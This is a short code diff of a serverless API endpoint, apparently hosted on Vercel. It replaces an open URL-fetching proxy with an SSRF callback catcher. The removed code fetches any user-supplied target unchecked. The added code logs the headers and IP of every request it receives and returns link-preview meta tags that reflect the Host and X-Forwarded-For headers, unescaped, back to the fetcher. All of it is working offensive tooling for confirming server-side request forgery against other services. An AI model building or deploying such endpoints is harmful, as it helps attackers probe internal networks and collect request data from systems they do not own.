@@ -1,19 +1,21 @@
-// /api/redirect.js on Vercel
-export default async function handler(req, res) {
-  const { target } = req.query;
+export default function handler(req, res) {
+  const log = {
+    headers: req.headers,
+    ip: req.socket.remoteAddress,
+    userAgent: req.headers['user-agent'],
+  };
 
-  const r = await fetch(target);
-  const text = await r.text();
+  console.log("SSRF Received:", JSON.stringify(log, null, 2));
 
-  // Try extract something meaningful (like <title> or sensitive values)
-  const titleMatch = text.match(/<title>(.*?)<\/title>/i);
-  const title = titleMatch ? titleMatch[1] : 'No title';
-
-  const descMatch = text.match(/meta name="description" content="(.*?)"/i);
-  const desc = descMatch ? descMatch[1] : 'No desc';
-
-  const imageMatch = text.match(/meta property="og:image" content="(.*?)"/i);
-  const image = imageMatch ? imageMatch[1] : 'http://yourhost.com/image.jpg';
-
-  return res.status(200).json({ title, description: desc, image });
+  res.writeHead(200, { 'Content-Type': 'text/html' });
+  res.end(`
+    <html>
+      <head>
+        <title>SSRF: ${req.headers['host']}</title>
+        <meta name="description" content="${req.headers['x-forwarded-for'] || 'unknown'}" />
+        <meta property="og:image" content="http://${req.headers['host']}/internal.png" />
+      </head>
+      <body>Logged</body>
+    </html>
+  `);
 }
